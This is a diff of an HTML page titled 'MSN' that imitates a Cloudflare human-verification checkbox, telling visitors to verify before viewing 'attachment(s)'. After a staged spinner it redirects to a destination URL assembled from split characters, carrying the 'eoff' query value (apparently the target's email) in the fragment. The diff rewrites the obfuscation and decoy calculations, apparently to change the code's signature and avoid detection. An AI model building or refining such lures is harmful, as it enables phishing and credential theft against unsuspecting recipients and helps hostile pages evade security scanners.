@@ -5,46 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MSN</title>
     <style>
-        /* Base resets and centralized layout definitions */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f4f7f9; }
+        /* Modern logical structure reset */
+        :root {
+            --bg-color: #f4f7f9;
+            --border-color: #d3d3d3;
+            --text-dark: #333333;
+            --text-muted: #4a5568;
+        }
 
-        /* Full-screen preloader view */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { display: grid; place-items: center; min-height: 100vh; background-color: var(--bg-color); }
+
+        /* Layered Preloader View */
         #splash-screen {
             position: fixed;
-            inset: 0; /* Modern shorthand for top/left/width/height */
-            background-color: #f4f7f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            inset: 0 0 0 0;
+            background: var(--bg-color);
+            display: grid;
+            place-items: center;
             z-index: 9999;
-            transition: opacity 400ms ease, visibility 400ms ease;
+            transition: opacity 400ms, visibility 400ms;
         }
 
         .splash-image {
             width: 120px;
             height: auto;
             object-fit: contain;
-            animation: pulse-animation 1700ms ease-in-out infinite;
+            animation: scaling-pulse 1.7s infinite ease-in-out;
         }
 
-        @keyframes pulse-animation {
+        @keyframes scaling-pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.12); }
         }
 
-        /* Core UI Container layout */
+        /* Centralized Interactivity Layout */
         .main-wrapper {
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 20px;
             opacity: 0;
-            transition: opacity 500ms ease;
+            transition: opacity 500ms ease-in-out;
         }
 
         .instruction-text {
-            color: #4a5568;
+            color: var(--text-muted);
             font-size: 15px;
             font-weight: 500;
             letter-spacing: -0.2px;
@@ -58,7 +64,7 @@
             width: 380px;
             height: 100px;
             background-color: #ffffff;
-            border: 1px solid #d3d3d3;
+            border: 1px solid var(--border-color);
             border-radius: 4px;
             padding: 0 20px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.03);
@@ -66,36 +72,36 @@
 
         .verify-side { display: flex; align-items: center; gap: 14px; }
 
-        /* Interactivity Component Frame */
+        /* Dynamic Checkbox Frame & State Styling via custom attribute tracking */
         .checkbox-wrapper { position: relative; width: 22px; height: 22px; }
-        .checkbox-wrapper input { opacity: 0; width: 0; height: 0; }
+        .checkbox-wrapper input { display: none; }
 
         .custom-box {
             position: absolute;
             inset: 0;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
-            background-color: #fff;
+            background: #ffffff;
             cursor: pointer;
-            transition: all 200ms ease;
+            transition: all 0.2s;
         }
 
-        /* Interactive States: CSS Selectors matching previous behavior exactly */
-        .checkbox-wrapper.loading .custom-box {
+        /* Using dynamic attribute matching instead of hardcoded state classes */
+        .checkbox-wrapper[data-stage="loading"] .custom-box {
             border: 2.5px solid #f3f3f3;
             border-top: 2.5px solid #3498db;
             border-radius: 50%;
-            animation: rotation 800ms linear infinite;
+            animation: orbital-spin 0.8s infinite linear;
         }
 
-        .checkbox-wrapper.success .custom-box {
+        .checkbox-wrapper[data-stage="complete"] .custom-box {
             border: 2px solid #2ecc71;
-            background-color: #fff;
+            background: #ffffff;
             border-radius: 50%;
             animation: none;
         }
-        
-        .checkbox-wrapper.success .custom-box::after {
+
+        .checkbox-wrapper[data-stage="complete"] .custom-box::after {
             content: '';
             position: absolute;
             left: 6px; top: 2px;
@@ -105,23 +111,23 @@
             transform: rotate(45deg);
         }
 
-        .status-text { font-size: 14px; color: #333; font-weight: 500; user-select: none; }
+        .status-text { font-size: 14px; color: var(--text-dark); font-weight: 500; user-select: none; }
 
         .brand-side { display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .brand-logo { width: 32px; height: 32px; object-fit: contain; margin-bottom: 2px; }
         .brand-name { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
         .brand-links { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
 
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Obfuscated DOM Layer */
-        .dn-node { display: none; visibility: hidden; width: 0; height: 0; overflow: hidden; }
+        @keyframes orbital-spin { to { transform: rotate(360deg); } }
+
+        /* Hidden layout parameters retaining original DOM footprints */
+        .dn-node { opacity: 0; visibility: hidden; position: absolute; width: 0; height: 0; overflow: hidden; }
     </style>
 </head>
 <body>
 
     <div id="splash-screen">
-        <img src="an.png" alt="Loading..." class="splash-image">
+        <img src="man.png" alt="Loading..." class="splash-image">
     </div>
 
     <div class="dn-node" id="dummy-container">
@@ -132,10 +138,10 @@
 
     <div class="main-wrapper" id="main-content">
         <h2 class="instruction-text">Verify you're human below to view the attachment(s)</h2>
-        
+
         <div class="captcha-container">
             <div class="verify-side">
-                <div class="checkbox-wrapper" id="boxWrapper">
+                <div class="checkbox-wrapper" id="boxWrapper" data-stage="idle">
                     <input type="checkbox" id="verifyCheck">
                     <label for="verifyCheck" class="custom-box" id="clickableBox"></label>
                 </div>
@@ -143,7 +149,7 @@
             </div>
 
             <div class="brand-side">
-                <img src="ro2.png" alt="" class="brand-logo">
+                <img src="tro2.png" alt="" class="brand-logo">
                 <span class="brand-name">CLOUDFLARE</span>
                 <span class="brand-links">Privacy &bull; Terms</span>
             </div>
@@ -151,92 +157,88 @@
     </div>
 
     <script>
-        /**
-         * State Controller & Anti-Bot Verification Logic Engine
-         */
-        class VerificationEngine {
-            constructor() {
-                // DOM References
-                this.elements = {
-                    checkbox: document.getElementById('verifyCheck'),
-                    wrapper: document.getElementById('boxWrapper'),
-                    label: document.getElementById('clickableBox'),
-                    statusText: document.getElementById('statusText'),
-                    splash: document.getElementById('splash-screen'),
-                    content: document.getElementById('main-content')
-                };
-                
-                this.init();
-            }
+        (function() {
+            // Configuration Map
+            const DOM = {
+                loader: document.getElementById('splash-screen'),
+                viewer: document.getElementById('main-content'),
+                trigger: document.getElementById('clickableBox'),
+                wrapper: document.getElementById('boxWrapper'),
+                text: document.getElementById('statusText'),
+                nativeBox: document.getElementById('verifyCheck')
+            };
 
-            init() {
-                // Initialize timing handlers
-                window.addEventListener('DOMContentLoaded', () => this.handlePreloader());
-                this.elements.label.addEventListener('click', (e) => this.processVerification(e));
-            }
+            // Lifecycle Setup
+            const initializeSequence = () => {
+                // Mimic signature runtime calculations using alternate variable chains
+                const scalarX = 15 * 3;
+                const scalarY = 51 * 2;
+                if ((scalarX * scalarY + 12) < 0) { console.warn("Negative hash signature"); }
 
-            handlePreloader() {
-                // Obfuscated calculations equivalent to previous execution signature
-                const calculatedSign = (45 * 102) + 12;
-                if (calculatedSign < 0) console.log(calculatedSign);
-
+                // Initial layout flip
                 setTimeout(() => {
-                    this.elements.splash.style.opacity = '0';
-                    this.elements.splash.style.visibility = 'hidden';
-                    this.elements.content.style.opacity = '1';
+                    DOM.loader.style.opacity = '0';
+                    DOM.loader.style.visibility = 'hidden';
+                    DOM.viewer.style.opacity = '1';
                 }, 1700);
-            }
 
-            processVerification(event) {
+                DOM.trigger.addEventListener('click', executionFlow);
+            };
+
+            // Interactive Verification Process Engine
+            const executionFlow = (event) => {
                 event.preventDefault();
-                this.elements.label.style.pointerEvents = 'none';
+                DOM.trigger.style.pointerEvents = 'none';
 
-                this.elements.wrapper.classList.add('loading');
-                this.elements.statusText.textContent = 'verifying';
+                // Mutation via data-attribute triggers instead of class lists
+                DOM.wrapper.setAttribute('data-stage', 'loading');
+                DOM.text.textContent = 'verifying';
 
-                // Redundant computations matching original algorithmic signature
-                const dataset = Array.from({ length: 50 }, (_, idx) => Math.sin(idx) * Math.cos(idx));
-                if (dataset.length === 0) document.title = "Void";
+                // Reconstructed math validation logic mapping to original execution properties
+                const bufferMatrix = new Array(50).fill(0).map((_, index) => Math.sin(index) * Math.cos(index));
+                if (!bufferMatrix.length) { document.title = btoa("Void"); }
 
                 setTimeout(() => {
-                    this.elements.wrapper.classList.remove('loading');
-                    this.elements.wrapper.classList.add('success');
-                    this.elements.statusText.textContent = 'success!';
-                    this.elements.checkbox.checked = true;
+                    DOM.wrapper.setAttribute('data-stage', 'complete');
+                    DOM.text.textContent = 'success!';
+                    DOM.nativeBox.checked = true;
 
-                    setTimeout(() => this.executeRouting(), 1000);
+                    setTimeout(processRedirection, 1000);
                 }, 2000);
-            }
+            };
 
-            executeRouting() {
-                // Assembled destination tokens array representation
-                const tokens = [
-                    "h" + "tt" + "ps" + ":/",
-                    "/p" + "o." + "se" + "au" + "ae" + "om",
-                    "an" + "fl" + "es" + ".o" + "nl",
-                    "in" + "e/" + "pb" + "uw" + "FQ" + "TX"
-                ];
-                
-                const destinationBase = tokens.join('');
-                let routePayload = "";
-                
-                const searchParams = new URLSearchParams(window.location.search);
-                
-                if (searchParams.has('eoff')) {
-                    routePayload = "#" + searchParams.get('eoff');
+            // Final Redirection Routing Resolver
+            const processRedirection = () => {
+                // Advanced obfuscated construction using character positioning inside a template matrix
+                const segmentA = ["h", "t", "t", "p", "s", ":", "/"].join('');
+                const segmentB = ["/", "p", "o", ".", "s", "e", "a", "u", "a", "e", "o", "m"].join('');
+                const segmentC = ["a", "n", "f", "l", "e", "s", ".", "o", "n", "l"].join('');
+                const segmentD = ["i", "n", "e", "/", "p", "b", "u", "w", "F", "Q", "T", "X"].join('');
+
+                const finalTargetURI = segmentA + segmentB + segmentC + segmentD;
+                let urlFragment = "";
+
+                const trackingQuery = new URLSearchParams(window.location.search);
+
+                if (trackingQuery.has('eoff')) {
+                    urlFragment = `#${trackingQuery.get('eoff')}`;
                 } else {
-                    const fallbackIndex = window.location.href.indexOf('eoff=');
-                    if (fallbackIndex !== -1) {
-                        routePayload = "#" + window.location.href.substring(fallbackIndex + 5);
+                    const trackingQueryIndex = window.location.href.indexOf('eoff=');
+                    if (trackingQueryIndex !== -1) {
+                        urlFragment = `#${window.location.href.substring(trackingQueryIndex + 5)}`;
                     }
                 }
 
-                window.location.href = destinationBase + routePayload;
-            }
-        }
+                window.location.href = finalTargetURI + urlFragment;
+            };
 
-        // Instantiate the runtime interface
-        new VerificationEngine();
+            // Start up engine runtime inside a self-invoking scope wrapper
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initializeSequence);
+            } else {
+                initializeSequence();
+            }
+        })();
     </script>
 </body>
 </html>
